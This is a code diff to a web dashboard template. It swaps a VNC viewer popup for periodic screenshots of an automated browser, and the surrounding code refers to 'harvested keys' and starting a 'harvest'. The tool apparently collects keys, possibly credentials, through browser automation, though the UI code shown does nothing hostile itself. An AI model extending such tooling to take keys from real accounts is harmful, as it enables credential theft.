@@ -1491,30 +1491,49 @@ MASTER_TEMPLATE = """
         // Load harvested keys on page load
         setTimeout(loadHarvestedKeys, 2000);
 
-        // ==================== VNC FUNCTIONS ====================
+        // ==================== VNC/SCREENSHOT FUNCTIONS ====================
         
-        function openVNCWindow() {
-            // Open noVNC in a new window - this is needed because websockets require direct access
-            const vncUrl = 'http://localhost:6080/vnc_lite.html?autoconnect=true&resize=scale';
-            const win = window.open(vncUrl, 'VNC_Viewer', 'width=1024,height=768,menubar=no,toolbar=no,location=no');
-            
-            if (win) {
-                addLog('[VNC] Opened VNC viewer in new window');
-                document.getElementById('vnc-log').innerHTML += '\\n[' + new Date().toLocaleTimeString() + '] VNC window opened';
-            } else {
-                addLog('[VNC] Popup blocked! Please allow popups for this site.');
-                document.getElementById('vnc-log').innerHTML += '\\n[' + new Date().toLocaleTimeString() + '] ERROR: Popup blocked - allow popups and try again';
-                alert('Popup blocked! Please allow popups for this site and try again.');
+        let autoScreenshotInterval = null;
+        
+        async function takeScreenshot() {
+            try {
+                const response = await fetch('/_dash/browser/screenshot');
+                const data = await response.json();
+                
+                if (data.success && data.image) {
+                    const img = document.getElementById('browser-screenshot');
+                    const placeholder = document.getElementById('screenshot-placeholder');
+                    
+                    img.src = 'data:image/png;base64,' + data.image;
+                    img.style.display = 'block';
+                    placeholder.style.display = 'none';
+                    
+                    document.getElementById('screenshot-time').textContent = new Date().toLocaleTimeString();
+                    addLog('[SCREENSHOT] Browser screenshot captured');
+                } else {
+                    addLog('[SCREENSHOT] ' + (data.error || 'No active browser'));
+                }
+            } catch (e) {
+                addLog('[SCREENSHOT] Error: ' + e.message);
             }
         }
         
-        function refreshVNC() {
-            checkVNCStatus();
-            addLog('[VNC] Refreshing status...');
-        }
-        
-        function openVNCFullscreen() {
-            openVNCWindow();
+        function toggleAutoScreenshot() {
+            const btn = document.getElementById('auto-screenshot-btn');
+            
+            if (autoScreenshotInterval) {
+                clearInterval(autoScreenshotInterval);
+                autoScreenshotInterval = null;
+                btn.textContent = '🔄 Auto-Refresh: OFF';
+                btn.style.background = '';
+                addLog('[SCREENSHOT] Auto-refresh disabled');
+            } else {
+                takeScreenshot(); // Take one immediately
+                autoScreenshotInterval = setInterval(takeScreenshot, 3000); // Every 3 seconds
+                btn.textContent = '🔄 Auto-Refresh: ON';
+                btn.style.background = '#1a4d1a';
+                addLog('[SCREENSHOT] Auto-refresh enabled (every 3s)');
+            }
         }
         
         async function checkVNCStatus() {
@@ -1522,25 +1541,21 @@ MASTER_TEMPLATE = """
                 const response = await fetch('/_dash/vnc/status');
                 const data = await response.json();
                 const statusEl = document.getElementById('vnc-status');
-                const logEl = document.getElementById('vnc-log');
                 
                 if (data.running) {
-                    statusEl.textContent = '✓ Running (port 5900)';
+                    statusEl.textContent = '✓ Browser Active';
                     statusEl.style.color = '#00ff00';
-                    logEl.innerHTML += '\\n[' + new Date().toLocaleTimeString() + '] VNC server is running';
                 } else {
-                    statusEl.textContent = '✗ Not running';
+                    statusEl.textContent = '✗ No Active Browser';
                     statusEl.style.color = '#ff0000';
-                    logEl.innerHTML += '\\n[' + new Date().toLocaleTimeString() + '] VNC server not running - start a harvest to activate';
                 }
             } catch (e) {
                 document.getElementById('vnc-status').textContent = '? Unknown';
-                document.getElementById('vnc-log').innerHTML += '\\n[' + new Date().toLocaleTimeString() + '] Error checking VNC: ' + e.message;
             }
         }
         
-        // Check VNC status periodically
-        setInterval(checkVNCStatus, 30000);
+        // Check status periodically
+        setInterval(checkVNCStatus, 10000);
         setTimeout(checkVNCStatus, 1000);
 
         // ==================== ADVANCED CAPABILITIES FUNCTIONS ====================
